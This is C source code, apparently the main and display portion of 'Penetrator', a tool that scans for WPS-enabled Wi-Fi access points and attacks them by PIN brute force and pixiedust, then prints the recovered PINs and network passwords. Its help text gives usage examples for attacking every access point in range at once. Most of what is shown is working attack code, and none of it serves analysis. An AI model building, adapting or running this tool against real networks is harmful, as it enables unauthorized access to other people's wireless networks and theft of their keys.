    if(rows<15||cols<28){printf("Terminal too small\n");usleep(1000000);continue;}
    int totalt=0;
    unsigned long long int lastsuc[32],tgt[32];
    char resultpin[32][9],resultpass[32][256],ssids[32][256];
    char sleeping[32][32],timelimit[32][32];

    char *streak[32];
    int streakn[32];
    sem_wait(&mutex);
    ATTACK_INFO *attack=attack_list;
    while(attack){
      lastsuc[totalt]=attack->lastsuc;
      char *to=(char*)&tgt[totalt];
      char *from=(char*)&(attack->tgt_mac);
      to[0]=from[5];
      to[1]=from[4];
      to[2]=from[3];
      to[3]=from[2];
      to[4]=from[1];
      to[5]=from[0];

      strcpy(resultpass[totalt],attack->foundpass);
      strcpy(resultpin[totalt],attack->foundpin);
      if(attack->ssid)strcpy(ssids[totalt],attack->ssid);
      else strcpy(ssids[totalt],"unknown");
 
      if(attack->waittil>gettick())sprintf(sleeping[totalt],"%llus",(attack->waittil-gettick())/1000);
      else strcpy(sleeping[totalt],"no");

      if(attack->wins)streak[totalt]="wins";
      else streak[totalt]="fails";
      streakn[totalt]=attack->inarow;

      if(attack->timelimit){
        if(attack->timelimit>gettick())sprintf(timelimit[totalt],"%llus",(attack->timelimit-gettick())/1000);
        else sprintf(timelimit[totalt],"killed");
      }
      else strcpy(timelimit[totalt],"no");

      totalt++;
      attack=attack->next;
    }
    sem_post(&mutex);
    //24 cols, 3 rows = 1 report
    int lineswritten=1;
    for(i=0;i<cols;i++)putchar('*');putchar('\n');
    
    for(j=0;j<totalt;j+=cols/26){
      for(i=0;i<cols/26;i++){
        if(i+j>=totalt)continue;
        printf("**");
        char text[32];
        int len=sprintf(text," ID %d",j+i);
        printf("%s",text);
        spaces(24-len);
      }
      lineswritten++;
      printf("**\n");

      for(i=0;i<cols/26;i++){
        if(i+j>=totalt)continue;
        printf("**");
        char text[32];
        int len=sprintf(text," SSID: %s",ssids[j+i]);
        printf("%s",text);
        spaces(24-len);
      }
      printf("**\n");
      lineswritten++;

      for(i=0;i<cols/26;i++){
        if(i+j>=totalt)continue;
        printf("** TGT: %02hhX:%02hhX:%02hhX:%02hhX:%02hhX:%02hhX ",((unsigned char*)&tgt[j+i])[0],
        ((unsigned char*)&tgt[j+i])[1],((unsigned char*)&tgt[j+i])[2],((unsigned char*)&tgt[j+i])[3],
        ((unsigned char*)&tgt[j+i])[4],((unsigned char*)&tgt[j+i])[5]);
      }
      printf("**\n");
      lineswritten++;

      for(i=0;i<cols/26;i++){
        if(i+j>=totalt)continue;
        printf("**");
        char text[32];
        int len=sprintf(text," Last PIN: %08llu",lastsuc[j+i]);
        printf("%s",text);
        spaces(24-len);
      }
      printf("**\n");
      lineswritten++;

      for(i=0;i<cols/26;i++){
        if(i+j>=totalt)continue;
        printf("**");
        char text[32];
        int len=sprintf(text," Streak: %d %s",streakn[j+i],streak[j+i]);
        printf("%s",text);
        spaces(24-len);
      }
      printf("**\n");
      for(i=0;i<cols/26;i++){
        if(i+j>=totalt)continue;
        printf("**");
        char text[32];
        int len=sprintf(text," AP PIN: %s",resultpin[j+i]);
        printf("%s",text);
        spaces(24-len);
      }
      printf("**\n");

      for(i=0;i<cols/26;i++){
        if(i+j>=totalt)continue;
        printf("**");
        char text[32];
        char propass[32];
        memset(propass,0,32);
        if(strlen(resultpass[j+i])<11)strcpy(propass,resultpass[j+i]);
        else {int k;for(k=0;k<11;k++)propass[k]=resultpass[j+i][k];strcat(propass,"...");}
        int len=sprintf(text," AP key: %s",propass);
        printf("%s",text);
        spaces(24-len);
      }
      printf("**\n");

      for(i=0;i<cols/26;i++){
        if(i+j>=totalt)continue;
        printf("**");
        char text[32];
        int len=sprintf(text," Sleeping: %s",sleeping[j+i]);
        printf("%s",text);
        spaces(24-len);
      }
      printf("**\n");
      for(i=0;i<cols/26;i++){
        if(i+j>=totalt)continue;
        printf("**");
        char text[32];
        int len=sprintf(text," Timelimit: %s",timelimit[j+i]);
        printf("%s",text);
        spaces(24-len);
      }
      printf("**\n");

      for(i=0;i<cols;i++)putchar('*');putchar('\n');
      lineswritten+=7;
    }
    for(i=0;i<rows-lineswritten;i++)putchar('\n');
    sleep(1);
  }
  return NULL;
}

void help(char *prog){
  printf("\n\nPenetrator beta v1\n\n");
  printf("Basic command line options:\n");
  printf("\t-h\t\tDisplay help\n");
  printf("\t-i <dev>\tSet monitor mode device to use\n");
  printf("\t-s\t\tScan for WPS enabled APs\n");
  printf("\t-c <channel>\tSet channel(s)\n");
  printf("\t-b <bssid>\tSet target(s)\n");
  printf("\nAdvanced command line options:\n");
  printf("\t-A \t\tScan for WPS APs and try pixiedust on all of them\n");
  printf("\t-M \t\tDisable attacking multiple APs at once (only -A)\n");
  printf("\t-P \t\tDisable pixiewps after M3 is received\n");
  printf("\t-D \t\tDisable loading sessions - starts new\n");
  printf("\t-W \t\tWait after every PIN attempt\n");
  printf("\t-v\t\tverbose - print info about WPS messages etc\n");
  printf("\t-vv\t\tverbose level 2 - print pixiewps data\n");
  printf("\t-t <seconds>\tSet time limit for scanning (default 10)\n");
  printf("\t-T <ms>\t\tSet timeout - when it occurs, resend last packet (default 1)\n");
  printf("\t-R <max>\t\tSet maximum resends (default 5)\n");
  printf("\t-S <seconds>\tSleep after 10 failures in a row (default 60)\n");
  printf("\t-N \t\tIgnore NACKs (debug)\n");
  printf("\nUsage examples:\n");
  printf("Attack APs with BSSID1 and BSSID2 on channel 1:\n\t%s -i mon0 -c 1 -b BSSID1 -b BSSID2\n\n",prog);
  printf("Attack all WPS APs on channel 1:\n\t%s -i mon0 -c 1\n\n",prog);
  printf("Attack all WPS APs in range, multiple at once:\n\t%s -i mon0 -A\n\n",prog);
  printf("Attack all WPS APs in range one by one:\n\t%s -i mon0 -A -M\n\n",prog);
  printf("Attack all WPS APs on channels 1 and 6:\n\t%s -i mon0 -A -c 1 -c 6\n\n",prog);
  exit(0);
}

int main(int argc,char **argv){
  if(argc==1)help(argv[0]);
  passlist=NULL;
  homedir=getenv("HOME");
  if(homedir){
    char total[512];
    sprintf(total,"%s/.penetrator",homedir);
    mkdir(total,S_IRUSR|S_IWUSR);
  }
  signal(SIGINT,ctrlc);

  int i;
  threads=0;
  ffmac=hex2int("FF FF FF FF FF FF",1);
  char *device=NULL;
  char scanmode=0;
  char onlyscan=0;
  char *src_mac=NULL;
  int channels[64];
  int nch=0;
  int noc=0;
  int scantime=10;
  int ttt=0;
  char *targets[1024];
  char *dssid[1024];
  memset(dssid,0,1024*8);
  VERBOSE=0;
  TIMEOUT=1000;
  MAXRESEND=5;
  AKTCHANNEL=0;
  FAILSLEEP=60;
  autoatak=0;
  MIDDELAY=0;
  FUCKSESSIONS=0;
  killgui=0;
  SCANLIST *wifi=NULL;
  PIXIEDUST=detectpixie();
  int multiattack=1;
  FUCKNACK=0;
  int fastpixie=0;

  srand(time(NULL));
  attack_list=NULL;
  sem_init(&mutex,0,1);
  sem_init(&passes_sem,0,1);
  sem_init(&sendmutex,0,1);
  sem_wait(&sendmutex);
  for(i=1;i<argc;i++){
     if(!strcmp(argv[i],"-h"))help(argv[0]);
else if(!strcmp(argv[i],"-i"))if((i+1)>=argc||argv[i+1][0]=='-')return printf("Error: -i requires an argument\n"); else device=argv[++i];
else if(!strcmp(argv[i],"-s"))onlyscan=1;
else if(!strcmp(argv[i],"-m"))if((i+1)>=argc||argv[i+1][0]=='-')return printf("Error: -m requires an argument\n"); else src_mac=argv[++i];
else if(!strcmp(argv[i],"-c"))if((i+1)>=argc||argv[i+1][0]=='-')return printf("Error: -c requires an argument\n"); else{sscanf(argv[++i],"%d",&channels[nch++]);noc=1;}
else if(!strcmp(argv[i],"-b"))if((i+1)>=argc||argv[i+1][0]=='-')return printf("Error: -b requires an argument\n"); else{targets[ttt++]=argv[++i];scanmode=0;}
else if(!strcmp(argv[i],"-e"))if((i+1)>=argc||argv[i+1][0]=='-')return printf("Error: -e requires an argument\n"); else dssid[ttt]=argv[++i];
else if(!strcmp(argv[i],"-t"))if((i+1)>=argc||argv[i+1][0]=='-')return printf("Error: -t requires an argument\n"); else sscanf(argv[++i],"%d",&scantime);
else if(!strcmp(argv[i],"-vv"))VERBOSE=2;
else if(!strcmp(argv[i],"-v"))VERBOSE=1;
else if(!strcmp(argv[i],"-T"))if((i+1)>=argc||argv[i+1][0]=='-')return printf("Error: -T requires an argument\n"); else sscanf(argv[++i],"%u",&TIMEOUT);
else if(!strcmp(argv[i],"-R"))if((i+1)>=argc||argv[i+1][0]=='-')return printf("Error: -R requires an argument\n"); else sscanf(argv[++i],"%u",&MAXRESEND);
else if(!strcmp(argv[i],"-S"))if((i+1)>=argc||argv[i+1][0]=='-')return printf("Error: -S requires an argument\n"); else sscanf(argv[++i],"%llu",&FAILSLEEP);
else if(!strcmp(argv[i],"-A")){fastpixie=1;scanmode=1;}
else if(!strcmp(argv[i],"-M"))multiattack=0;
else if(!strcmp(argv[i],"-P"))PIXIEDUST=0;
else if(!strcmp(argv[i],"-N"))FUCKNACK=1;
else if(!strcmp(argv[i],"-D"))FUCKSESSIONS=1;
else if(!strcmp(argv[i],"-W"))if((i+1)>=argc||argv[i+1][0]=='-')return printf("Error: -W requires an argument\n"); else sscanf(argv[++i],"%llu",&MIDDELAY);
  }
 
 if(nch==0){
   nch=13;
   channels[0]=1;
   channels[1]=2;
   channels[2]=3;
   channels[3]=4;
   channels[4]=5;
   channels[5]=6;
   channels[6]=7;
   channels[7]=8;
   channels[8]=9;
   channels[9]=10;
   channels[10]=11;
   channels[11]=12;
   channels[12]=13;
 }
 if(!device){
    printf("[PENETRATOR] No device specified, please choose from the list below:\n");
    pcap_if_t *devs;
    pcap_findalldevs(&devs,NULL);
    pcap_if_t *akt=devs;
    pcap_if_t *arr[32];
    int i=0;
    while(akt){
      arr[i++]=akt;
      printf("%d. %s\n",i,akt->name);
      akt=akt->next;
    }
    printf("\nChoose device ID: ");
    device=malloc(64);
    int chosen;
    scanf("%d",&chosen);
    if(chosen<1||chosen>i)return printf("[PENETRATOR] Wrong device ID\n");
    strcpy(device,arr[chosen-1]->name);
    pcap_freealldevs(devs);
  }
  if(!src_mac){
    struct ifreq ifr;
    unsigned char *mac;
    int fd = socket(AF_INET,SOCK_DGRAM,0);
    ifr.ifr_addr.sa_family=AF_INET;
    strcpy(ifr.ifr_name,device);
    ioctl(fd,SIOCGIFHWADDR,&ifr);
    close(fd);
    mac=(unsigned char *)ifr.ifr_hwaddr.sa_data;
    src_mac=malloc(18);
    sprintf(src_mac,"%02hhX:%02hhX:%02hhX:%02hhX:%02hhX:%02hhX",mac[0],mac[1],mac[2],mac[3],mac[4],mac[5]);
  }
  if(!fastpixie&&!ttt&&nch==1)scanmode=1;
  if(scanmode||onlyscan){
    printf("[PENETRATOR] Scanning for %d seconds\n",scantime);
    found=0;
    unsigned long long int lastchange=gettick();
    int channel=0;
    setchannel(device,channels[channel]);
    printf("\n\nID PWR      BSSID        CHANNEL\tWPS   LOCKED\tESSID\n");
    fp=pcap_open_live(device,65535,1,1000,NULL);
    if(!fp){printf("Error: Failed to open %s for capture\n",device);exit(1);}
    while(1){
      struct pcap_pkthdr head;
      const unsigned char *pkt=pcap_next(fp,&head);
      if(gettick()-lastchange>(scantime*1000)/nch){channel++;if(channel>=nch)break;setchannel(device,channels[channel]);lastchange=gettick();}
      if(!pkt)continue;
      else scanshit(pkt,head,&wifi);
    }
    pcap_close(fp);
    if(onlyscan)exit(0);
  }
  if(!fastpixie&&!noc&&!ttt)return printf("[PENETRATOR] No attack mode specified (-b,-c or -A)\n");
  if(!fastpixie&&ttt){
    if(nch==0)return printf("[PENETRATOR] Please specify channel (-c)\n");
    setchannel(device,channels[0]);
    for(i=0;i<ttt;i++)addattackex(src_mac,targets[i],1,0,dssid[i]);
  }
  if(!fastpixie&&!ttt&&nch==1){
    printf("[PENETRATOR] Attacking everything on channel %d\n",channels[0]);
    SCANLIST *akt=wifi;
    while(akt){
      char strmac[32];
      raw2hex(&akt->bssid,strmac,6);
      if(akt->channel==channels[0]&&strcmp(akt->ssid,"NULL"))addattackex(src_mac,strmac,1,0,NULL);
      akt=akt->next;
    }
  }
  pthread_t th;
  pthread_create(&th,0,init_device,device);
  if(!VERBOSE)pthread_create(&th,0,gui,NULL);
 
  if(fastpixie){
    if(multiattack){
      for(i=0;i<nch;i++){
        setchannel(device,channels[i]);
        SCANLIST *akt=wifi;
        threads=0;
        attack_list=NULL;
        while(akt){
          char strmac[32];
          raw2hex(&akt->bssid,strmac,6);
          if(akt->channel==channels[i]&&strcmp(akt->ssid,"NULL"))addattackex(src_mac,strmac,1,60000,NULL);
          akt=akt->next;
        }
        if(threads==0)continue;
        printf("\nATTACKING CHANNEL %d\n",channels[i]);
        while(1){
          autoatak=1;
          sleep(1);
          int active=0;
          sem_wait(&mutex);
          ATTACK_INFO *aktx=attack_list;
          while(aktx){
            if(aktx->active)active++;
            aktx=aktx->next;
          }
          sem_post(&mutex);
          if(!active)break;
        }
        autoatak=0;
      }
    }else{
      SCANLIST *akt=wifi;
      while(akt){
        autoatak=1;
        setchannel(device,akt->channel);
        char strmac[32];
        raw2hex(&akt->bssid,strmac,6);
        printf("ATTACK: %s\n",akt->ssid);
        attack_list=NULL;
        addattackex(src_mac,strmac,1,60000,NULL);
        while(attack_list&&attack_list->active)sleep(1);
        akt=akt->next;
      }
      autoatak=0;
    }
    killgui=1;
  }
  while(1){
    int active=0;
    sem_wait(&mutex);
    ATTACK_INFO *aktx=attack_list;
    while(aktx){
      if(aktx->active)active++;
      aktx=aktx->next;
    }
    sem_post(&mutex);
    if(!active)break;
    sleep(1);
  }

  sem_wait(&passes_sem);

  printf("\nPASSWORDS:\n");
  pASSES *akt=passlist;
  while(akt){
    printf("SSID: %s PIN: %s PASS: %s HEX: ",akt->ssid,akt->pin,akt->pass);printhex(akt->pass,akt->passlen);
    akt=akt->next;
  }
  return 0;
}
